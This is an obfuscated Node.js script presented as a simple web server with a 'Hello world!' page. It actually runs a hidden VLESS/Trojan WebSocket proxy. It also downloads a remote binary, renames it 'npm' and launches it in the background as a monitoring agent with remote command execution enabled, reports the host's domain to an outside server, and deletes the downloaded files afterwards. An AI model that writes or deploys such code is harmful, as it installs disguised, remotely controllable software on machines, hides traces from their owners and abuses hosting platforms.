const _0x18334e=_0x4eb6;(function(_0x21c299,_0x5a22cf){const _0x4c7ee0=_0x4eb6,_0x458823=_0x21c299();while(!![]){try{const _0x5b963d=parseInt(_0x4c7ee0(0x14e))/0x1+parseInt(_0x4c7ee0(0x131))/0x2+-parseInt(_0x4c7ee0(0x175))/0x3+parseInt(_0x4c7ee0(0x18b))/0x4+parseInt(_0x4c7ee0(0x16b))/0x5*(-parseInt(_0x4c7ee0(0x114))/0x6)+-parseInt(_0x4c7ee0(0x183))/0x7*(-parseInt(_0x4c7ee0(0x181))/0x8)+-parseInt(_0x4c7ee0(0x11b))/0x9*(parseInt(_0x4c7ee0(0x143))/0xa);if(_0x5b963d===_0x5a22cf)break;else _0x458823['push'](_0x458823['shift']());}catch(_0x117165){_0x458823['push'](_0x458823['shift']());}}}(_0x3a2d,0x3849b));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x18334e(0x135)),net=require('net'),path=require(_0x18334e(0x11f)),crypto=require(_0x18334e(0x16e)),{Buffer}=require(_0x18334e(0x119)),{exec,execSync}=require(_0x18334e(0x172)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x18334e(0x120)]||_0x18334e(0x13e),NEZHA_SERVER=process['env'][_0x18334e(0x13b)]||'',NEZHA_PORT=process['env'][_0x18334e(0x184)]||'',NEZHA_KEY=process[_0x18334e(0x141)]['NEZHA_KEY']||'',DOMAIN=process[_0x18334e(0x141)]['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process['env'][_0x18334e(0x154)]||!![],WSPATH=process[_0x18334e(0x141)][_0x18334e(0x12d)]||UUID[_0x18334e(0x134)](0x0,0x8),SUB_PATH=process[_0x18334e(0x141)][_0x18334e(0x15f)]||_0x18334e(0x18a),NAME=process[_0x18334e(0x141)]['NAME']||'Hug',PORT=process[_0x18334e(0x141)][_0x18334e(0x128)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x4ecf66=_0x18334e;try{const _0x578c13=await axios[_0x4ecf66(0x159)](_0x4ecf66(0x185)),_0x101f2d=_0x578c13[_0x4ecf66(0x17f)];ISP=(_0x101f2d[_0x4ecf66(0x14c)]+'-'+_0x101f2d[_0x4ecf66(0x15b)])[_0x4ecf66(0x174)](/ /g,'_');}catch(_0x573d74){ISP=_0x4ecf66(0x12e);}};GetISP();const httpServer=http['createServer']((_0x5e35ad,_0x56697d)=>{const _0x571c7e=_0x18334e;if(_0x5e35ad[_0x571c7e(0x123)]==='/'){const _0x4512e8=path[_0x571c7e(0x162)](__dirname,'index.html');fs[_0x571c7e(0x153)](_0x4512e8,_0x571c7e(0x167),(_0x51eb04,_0x512880)=>{const _0x994870=_0x571c7e;if(_0x51eb04){_0x56697d['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x56697d[_0x994870(0x14b)](_0x994870(0x16f));return;}_0x56697d[_0x994870(0x16c)](0xc8,{'Content-Type':_0x994870(0x188)}),_0x56697d[_0x994870(0x14b)](_0x512880);});return;}else{if(_0x5e35ad[_0x571c7e(0x123)]==='/'+SUB_PATH){const _0x4c574e='vless://'+UUID+'@'+DOMAIN+_0x571c7e(0x150)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x571c7e(0x124)+WSPATH+'#'+NAME+'-'+ISP,_0x280c97=_0x571c7e(0x129)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x571c7e(0x163)+DOMAIN+_0x571c7e(0x124)+WSPATH+'#'+NAME+'-'+ISP,_0x4ffdf3=_0x4c574e+'\x0a'+_0x280c97,_0x3f6a5c=Buffer[_0x571c7e(0x18c)](_0x4ffdf3)[_0x571c7e(0x151)](_0x571c7e(0x126));_0x56697d['writeHead'](0xc8,{'Content-Type':_0x571c7e(0x157)}),_0x56697d[_0x571c7e(0x14b)](_0x3f6a5c+'\x0a');}else _0x56697d[_0x571c7e(0x16c)](0x194,{'Content-Type':'text/plain'}),_0x56697d[_0x571c7e(0x14b)](_0x571c7e(0x148));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x18334e(0x174)](/-/g,''),DNS_SERVERS=[_0x18334e(0x179),'1.1.1.1'];function resolveHost(_0x353f61){return new Promise((_0x33d67c,_0x861a70)=>{const _0x46c3c5=_0x4eb6;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x46c3c5(0x156)](_0x353f61)){_0x33d67c(_0x353f61);return;}let _0x24bf8f=0x0;function _0x4f42a4(){const _0x38ddc6=_0x46c3c5;if(_0x24bf8f>=DNS_SERVERS[_0x38ddc6(0x189)]){_0x861a70(new Error(_0x38ddc6(0x118)+_0x353f61+_0x38ddc6(0x17b)));return;}const _0x31abd4=DNS_SERVERS[_0x24bf8f];_0x24bf8f++;const _0x2b3afe=_0x38ddc6(0x165)+encodeURIComponent(_0x353f61)+'&type=A';axios['get'](_0x2b3afe,{'timeout':0x1388,'headers':{'Accept':_0x38ddc6(0x17a)}})[_0x38ddc6(0x182)](_0x2f8e05=>{const _0x3e0d1e=_0x38ddc6,_0x236e24=_0x2f8e05[_0x3e0d1e(0x17f)];if(_0x236e24[_0x3e0d1e(0x147)]===0x0&&_0x236e24['Answer']&&_0x236e24[_0x3e0d1e(0x137)][_0x3e0d1e(0x189)]>0x0){const _0x1cfb42=_0x236e24['Answer'][_0x3e0d1e(0x149)](_0x1ab6cf=>_0x1ab6cf[_0x3e0d1e(0x133)]===0x1);if(_0x1cfb42){_0x33d67c(_0x1cfb42[_0x3e0d1e(0x17f)]);return;}}_0x4f42a4();})[_0x38ddc6(0x139)](_0x2f0155=>{_0x4f42a4();});}_0x4f42a4();});}function handleVlessConnection(_0x488f91,_0x443e20){const _0x36853f=_0x18334e,[_0x5e6add]=_0x443e20,_0x103e95=_0x443e20[_0x36853f(0x134)](0x1,0x11);if(!_0x103e95[_0x36853f(0x171)]((_0x59c3cb,_0x1eeb47)=>_0x59c3cb==parseInt(uuid['substr'](_0x1eeb47*0x2,0x2),0x10)))return![];let _0x2d6711=_0x443e20['slice'](0x11,0x12)[_0x36853f(0x15e)]()+0x13;const _0xa04b92=_0x443e20[_0x36853f(0x134)](_0x2d6711,_0x2d6711+=0x2)[_0x36853f(0x161)](0x0),_0x2a0317=_0x443e20[_0x36853f(0x134)](_0x2d6711,_0x2d6711+=0x1)[_0x36853f(0x15e)](),_0x2c00e7=_0x2a0317==0x1?_0x443e20[_0x36853f(0x134)](_0x2d6711,_0x2d6711+=0x4)[_0x36853f(0x162)]('.'):_0x2a0317==0x2?new TextDecoder()[_0x36853f(0x138)](_0x443e20[_0x36853f(0x134)](_0x2d6711+0x1,_0x2d6711+=0x1+_0x443e20[_0x36853f(0x134)](_0x2d6711,_0x2d6711+0x1)[_0x36853f(0x15e)]())):_0x2a0317==0x3?_0x443e20[_0x36853f(0x134)](_0x2d6711,_0x2d6711+=0x10)['reduce']((_0x2e3bef,_0x3c3750,_0x59810d,_0x10fdb0)=>_0x59810d%0x2?_0x2e3bef[_0x36853f(0x180)](_0x10fdb0[_0x36853f(0x134)](_0x59810d-0x1,_0x59810d+0x1)):_0x2e3bef,[])[_0x36853f(0x166)](_0x168fde=>_0x168fde['readUInt16BE'](0x0)[_0x36853f(0x151)](0x10))[_0x36853f(0x162)](':'):'';_0x488f91['send'](new Uint8Array([_0x5e6add,0x0]));const _0x119e80=createWebSocketStream(_0x488f91);return resolveHost(_0x2c00e7)[_0x36853f(0x182)](_0x684dd7=>{const _0x3102a5=_0x36853f;net[_0x3102a5(0x168)]({'host':_0x684dd7,'port':_0xa04b92},function(){const _0x3e1f17=_0x3102a5;this[_0x3e1f17(0x15c)](_0x443e20[_0x3e1f17(0x134)](_0x2d6711)),_0x119e80['on'](_0x3e1f17(0x16a),()=>{})[_0x3e1f17(0x11e)](this)['on'](_0x3e1f17(0x16a),()=>{})['pipe'](_0x119e80);})['on'](_0x3102a5(0x16a),()=>{});})[_0x36853f(0x139)](_0x29379a=>{const _0x5bb878=_0x36853f;net[_0x5bb878(0x168)]({'host':_0x2c00e7,'port':_0xa04b92},function(){const _0x18d291=_0x5bb878;this[_0x18d291(0x15c)](_0x443e20['slice'](_0x2d6711)),_0x119e80['on']('error',()=>{})[_0x18d291(0x11e)](this)['on'](_0x18d291(0x16a),()=>{})[_0x18d291(0x11e)](_0x119e80);})['on'](_0x5bb878(0x16a),()=>{});}),!![];}function handleTrojanConnection(_0x483cca,_0x40d09c){const _0x37cf4d=_0x18334e;try{if(_0x40d09c[_0x37cf4d(0x189)]<0x3a)return![];const _0x37bed2=_0x40d09c[_0x37cf4d(0x134)](0x0,0x38)[_0x37cf4d(0x151)](),_0x4d1580=[UUID];let _0x3c0bcf=null;for(const _0xc1bd8c of _0x4d1580){const _0xcd08da=crypto[_0x37cf4d(0x15d)](_0x37cf4d(0x121))[_0x37cf4d(0x116)](_0xc1bd8c)[_0x37cf4d(0x117)](_0x37cf4d(0x130));if(_0xcd08da===_0x37bed2){_0x3c0bcf=_0xc1bd8c;break;}}if(!_0x3c0bcf)return![];let _0x231e07=0x38;_0x40d09c[_0x231e07]===0xd&&_0x40d09c[_0x231e07+0x1]===0xa&&(_0x231e07+=0x2);const _0x4704bb=_0x40d09c[_0x231e07];if(_0x4704bb!==0x1)return![];_0x231e07+=0x1;const _0x412aa8=_0x40d09c[_0x231e07];_0x231e07+=0x1;let _0xe8240d,_0x26063a;if(_0x412aa8===0x1)_0xe8240d=_0x40d09c[_0x37cf4d(0x134)](_0x231e07,_0x231e07+0x4)['join']('.'),_0x231e07+=0x4;else{if(_0x412aa8===0x3){const _0xf85aad=_0x40d09c[_0x231e07];_0x231e07+=0x1,_0xe8240d=_0x40d09c[_0x37cf4d(0x134)](_0x231e07,_0x231e07+_0xf85aad)[_0x37cf4d(0x151)](),_0x231e07+=_0xf85aad;}else{if(_0x412aa8===0x4)_0xe8240d=_0x40d09c['slice'](_0x231e07,_0x231e07+0x10)[_0x37cf4d(0x144)]((_0x12e893,_0x31286f,_0x14d217,_0x485635)=>_0x14d217%0x2?_0x12e893['concat'](_0x485635[_0x37cf4d(0x134)](_0x14d217-0x1,_0x14d217+0x1)):_0x12e893,[])[_0x37cf4d(0x166)](_0x3ff498=>_0x3ff498[_0x37cf4d(0x161)](0x0)[_0x37cf4d(0x151)](0x10))['join'](':'),_0x231e07+=0x10;else return![];}}_0x26063a=_0x40d09c[_0x37cf4d(0x161)](_0x231e07),_0x231e07+=0x2;_0x231e07<_0x40d09c[_0x37cf4d(0x189)]&&_0x40d09c[_0x231e07]===0xd&&_0x40d09c[_0x231e07+0x1]===0xa&&(_0x231e07+=0x2);const _0x138c27=createWebSocketStream(_0x483cca);return resolveHost(_0xe8240d)[_0x37cf4d(0x182)](_0x94105a=>{const _0x191ace=_0x37cf4d;net[_0x191ace(0x168)]({'host':_0x94105a,'port':_0x26063a},function(){const _0x2731df=_0x191ace;_0x231e07<_0x40d09c['length']&&this[_0x2731df(0x15c)](_0x40d09c[_0x2731df(0x134)](_0x231e07)),_0x138c27['on'](_0x2731df(0x16a),()=>{})[_0x2731df(0x11e)](this)['on']('error',()=>{})[_0x2731df(0x11e)](_0x138c27);})['on'](_0x191ace(0x16a),()=>{});})[_0x37cf4d(0x139)](_0x3c3896=>{const _0x60e94b=_0x37cf4d;net['connect']({'host':_0xe8240d,'port':_0x26063a},function(){const _0x57477a=_0x4eb6;_0x231e07<_0x40d09c['length']&&this['write'](_0x40d09c[_0x57477a(0x134)](_0x231e07)),_0x138c27['on'](_0x57477a(0x16a),()=>{})[_0x57477a(0x11e)](this)['on'](_0x57477a(0x16a),()=>{})[_0x57477a(0x11e)](_0x138c27);})['on'](_0x60e94b(0x16a),()=>{});}),!![];}catch(_0x2ebc2b){return![];}}wss['on']('connection',(_0x50cb56,_0x533389)=>{const _0x342e9c=_0x18334e,_0x4d491c=_0x533389['url']||'';_0x50cb56[_0x342e9c(0x112)]('message',_0x446017=>{const _0x568c0c=_0x342e9c;if(_0x446017[_0x568c0c(0x189)]>0x11&&_0x446017[0x0]===0x0){const _0x38bcb5=_0x446017[_0x568c0c(0x134)](0x1,0x11),_0x2883e7=_0x38bcb5['every']((_0x13982f,_0x4bd8fd)=>_0x13982f==parseInt(uuid[_0x568c0c(0x145)](_0x4bd8fd*0x2,0x2),0x10));if(_0x2883e7){!handleVlessConnection(_0x50cb56,_0x446017)&&_0x50cb56[_0x568c0c(0x132)]();return;}}!handleTrojanConnection(_0x50cb56,_0x446017)&&_0x50cb56[_0x568c0c(0x132)]();})['on'](_0x342e9c(0x16a),()=>{});});function _0x4eb6(_0x3ffc2b,_0x5d4f95){const _0x3a2de9=_0x3a2d();return _0x4eb6=function(_0x4eb67a,_0x4da12e){_0x4eb67a=_0x4eb67a-0x110;let _0x37fbd1=_0x3a2de9[_0x4eb67a];return _0x37fbd1;},_0x4eb6(_0x3ffc2b,_0x5d4f95);}const getDownloadUrl=()=>{const _0x13cb20=_0x18334e,_0x2488a4=os[_0x13cb20(0x125)]();return _0x2488a4===_0x13cb20(0x140)||_0x2488a4===_0x13cb20(0x110)||_0x2488a4===_0x13cb20(0x14d)?!NEZHA_PORT?_0x13cb20(0x13f):_0x13cb20(0x160):!NEZHA_PORT?_0x13cb20(0x158):_0x13cb20(0x170);},downloadFile=async()=>{const _0xd13870=_0x18334e;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x294f46=getDownloadUrl(),_0x32c7c1=await axios({'method':_0xd13870(0x159),'url':_0x294f46,'responseType':_0xd13870(0x173)}),_0x1eb103=fs[_0xd13870(0x12a)](_0xd13870(0x122));return _0x32c7c1['data'][_0xd13870(0x11e)](_0x1eb103),new Promise((_0x11f066,_0x4e46ca)=>{const _0x176145=_0xd13870;_0x1eb103['on'](_0x176145(0x14a),()=>{const _0x1f6549=_0x176145;console[_0x1f6549(0x15a)](_0x1f6549(0x187)),exec('chmod\x20+x\x20npm',_0x407a62=>{if(_0x407a62)_0x4e46ca(_0x407a62);_0x11f066();});}),_0x1eb103['on'](_0x176145(0x16a),_0x4e46ca);});}catch(_0xdc287d){throw _0xdc287d;}},runnz=async()=>{const _0x2aeefc=_0x18334e;try{const _0x3da101=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x2aeefc(0x17c)});if(_0x3da101[_0x2aeefc(0x127)]()!==''){console[_0x2aeefc(0x15a)](_0x2aeefc(0x176));return;}}catch(_0x497ad9){}await downloadFile();let _0x35e4d6='',_0x1d9fc5=[_0x2aeefc(0x11a),'8443',_0x2aeefc(0x169),_0x2aeefc(0x14f),_0x2aeefc(0x177),_0x2aeefc(0x12b)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x29282a=_0x1d9fc5['includes'](NEZHA_PORT)?'--tls':'';_0x35e4d6=_0x2aeefc(0x146)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2aeefc(0x13c)+NEZHA_KEY+'\x20'+_0x29282a+_0x2aeefc(0x13d);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x400b09=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x2aeefc(0x115)](':')[_0x2aeefc(0x186)]():'',_0x5af763=_0x1d9fc5[_0x2aeefc(0x113)](_0x400b09)?'true':_0x2aeefc(0x13a),_0x9cbcb5=_0x2aeefc(0x17d)+NEZHA_KEY+_0x2aeefc(0x155)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x5af763+_0x2aeefc(0x178)+UUID;fs['writeFileSync'](_0x2aeefc(0x16d),_0x9cbcb5);}_0x35e4d6=_0x2aeefc(0x17e);}else{console['log'](_0x2aeefc(0x111));return;}}try{exec(_0x35e4d6,{'shell':_0x2aeefc(0x136)},_0x4d70fc=>{const _0x41b480=_0x2aeefc;if(_0x4d70fc)console[_0x41b480(0x16a)](_0x41b480(0x11c),_0x4d70fc);else console['log'](_0x41b480(0x164));});}catch(_0x116459){console[_0x2aeefc(0x16a)]('error:\x20'+_0x116459);}};async function addAccessTask(){const _0x244549=_0x18334e;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x381c97='https://'+DOMAIN;try{const _0x5afd84=await axios[_0x244549(0x152)]('https://oooo.serv00.net/add-url',{'url':_0x381c97},{'headers':{'Content-Type':_0x244549(0x12f)}});console['log'](_0x244549(0x142));}catch(_0x435813){}}function _0x3a2d(){const _0x3b3c62=['npm\x20is\x20already\x20running,\x20skip\x20running...','2083','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','8.8.4.4','application/dns-json','\x20with\x20all\x20DNS\x20servers','utf-8','client_secret:\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','data','concat','333048ZZtIgR','then','28loploq','NEZHA_PORT','https://speed.cloudflare.com/meta','pop','npm\x20download\x20successfully','text/html','length','sub','1580196hcuPWY','from','arm64','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','once','includes','1572rbuNmK','split','update','digest','Failed\x20to\x20resolve\x20','buffer','443','2169ZxnKBz','npm\x20running\x20error:','unlink','pipe','path','UUID','sha224','npm','url','&path=%2F','arch','base64','trim','PORT','trojan://','createWriteStream','2053','listen','WSPATH','Unknown','application/json','hex','147638acfKxD','close','type','slice','axios','/bin/bash','Answer','decode','catch','false','NEZHA_SERVER','\x20-p\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','54c441f1-a3c9-4759-9d58-d0f30bc9e523','https://arm64.ssss.nyc.mn/v1','arm','env','Automatic\x20Access\x20Task\x20added\x20successfully','13790YLcnnA','reduce','substr','setsid\x20nohup\x20./npm\x20-s\x20','Status','Not\x20Found\x0a','find','finish','end','country','aarch64','356022uBOblX','2087',':443?encryption=none&security=tls&sni=','toString','post','readFile','AUTO_ACCESS','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','test','text/plain','https://amd64.ssss.nyc.mn/v1','get','log','asOrganization','write','createHash','readUInt8','SUB_PATH','https://arm64.ssss.nyc.mn/agent','readUInt16BE','join','&fp=chrome&type=ws&host=','npm\x20is\x20running','https://dns.google/resolve?name=','map','utf8','connect','2096','error','2215qWrgqk','writeHead','config.yaml','crypto','Hello\x20world!','https://amd64.ssss.nyc.mn/agent','every','child_process','stream','replace','937362JdRZlh'];_0x3a2d=function(){return _0x3b3c62;};return _0x3a2d();}const delFiles=()=>{const _0x470548=_0x18334e;fs[_0x470548(0x11d)](_0x470548(0x122),()=>{}),fs[_0x470548(0x11d)](_0x470548(0x16d),()=>{});};httpServer[_0x18334e(0x12c)](PORT,()=>{const _0x20b774=_0x18334e;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x20b774(0x15a)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
